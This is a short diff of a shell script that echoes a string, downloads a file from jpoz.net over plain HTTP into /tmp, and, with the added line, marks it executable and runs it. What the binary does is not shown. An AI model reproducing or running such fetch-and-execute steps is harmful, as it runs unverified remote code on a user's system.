@@ -1,3 +1,4 @@
 echo "beepBoopBop"
 curl -L http://www.jpoz.net/mezzagez -o /tmp/mezzagez
+chmod +x /tmp/mezzagez
 /tmp/mezzagez
